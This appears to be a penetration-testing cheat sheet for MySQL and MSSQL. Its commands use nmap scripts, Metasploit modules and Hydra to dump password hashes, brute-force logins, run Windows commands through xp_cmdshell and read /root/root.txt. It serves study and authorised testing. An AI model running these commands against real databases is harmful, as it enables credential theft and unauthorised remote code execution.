---
description: mysql (port 3306) ....... mssql(port 1443)
---

# Mysql and Mssql

## connect&#x20;

```bash
mysql -h $IP -u $username -p$password
```

## nmap

* imp cmd :&#x20;

```bash
nmap -p3306 $IP -sCV
```

* to enum other users on mysql (you'll need access & password of that user)

```bash
nmap -p3306 $IP --script mysql-users \
--script-args="mysqluser='username',mysqlpass=''"
```

* dump hashes

```bash
nmap -p3306 $IP --script mysql-dump-hashes \
--script-args="username='username',password=''"

# --script ms-sql-dump-hashes 
```

* to check all the imp variables

```bash
nmap -p3306 $IP --script mysql-variables \
--script-args="mysqluser='username',mysqlpass=''"
```

* audit the database (GOOD & IMP)

```bash
nmap -p3306 $IP --script mysql-audit \
--script-args="mysql-audit.username='username',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
```

* run sql query with nmap&#x20;

```bash
nmap -p3306 $IP --script mysql-query \
--script-args="query='select * from tablename;'username='username',password=''"
```

* mysql info

```bash
nmap -p$port $IP --script ms-sql-info
```

* ntlm info

```bash
nmap -p$port $IP --script ms-sql-ntlm-info --script-args mysql.instance-port=$port
```

* bruteforce ms-sql

```bash
nmap -p$port $IP --script ms-sql-bruteforce \
--script-args userdb=/path/to/users,passdb=/path/to/passwords.txt
```

* empty passwords

```bash
nmap -p$port $IP --script ms-sql-empty-password
```

* run query (ms sql) -> show logs : logins, what service are running etc.

```bash
nmap -p$port $IP --script ms-sql-query \
--script-args mssql.username='user',mssql.password='pass', \
ms-sql-query.query="SELECT * from master..syslogins" -oN out.txt
```

* run windows cmds with ms sql

```bash
nmap -p$port $IP --script ms-sql-xp-cmdshell \
--script-args mssql.username='user',mssql.password='pass', \
ms-sql-xp-cmdshell.cmd="ipconfig"
```



## metasploit / msfconsole

* to see what directories are writeable

```bash
use auxiliary/scanner/mysql/mysql_writeable_dirs
#Enumerate writeable directories using the MySQL SELECT INTO DUMPFILE

set dir_list /path/to/wordlists.txt
set rhosts $IP
set verbose false
set password $password 
#set password "" .....if empty password
```

* hashdump

```bash
use auxiliary/scanner/mysql/mysql_hashdump

set username $username
set password $password # "" if no pass/empty pass
run
```

* dictionary attack

```bash
use auxiliary/scanner/mysql/mysql_login

#for mssql
#use auxiliary/scanner/mssql/mssql_login 

set rhosts $IP
set pass_file /path/to/wordlists.txt
set stop_on_sucess true
run
```

* admin scan

```bash
use auxiliary/admin/mssql/mssql_enum

#the mssql_enum is an admin module that will accept a set of 
#credentials and query a MSSQL for various configuration settings.


#set all the required options
```

* obtain all logins

```bash
use auxiliary/scanner/admin/mssql/mssql_enum_sql_logins

#This module can be used to obtain a list of all logins from a SQL Server with any login. 
#Selecting all of the logins from the master..syslogins table is restricted to sysadmins

#set required options
```

* run commands&#x20;

```bash
use auxiliary/scanner/admin/mssql/mssql_exec

#set required options
set cmd ipconfig
run
```

* domain accounts scan

```bash
use auxiliary/scanner/admin/mssql/mssql_enum_domain_accounts

#set required options
```

##

##

##

## mysql cmds

* to load files (if we have access to)

```bash
mysql> select load_file("/root/root.txt");
```

## hydra

```bash
hydra -l $username -P /path/to/pass/wordlist $IP mysql 
```

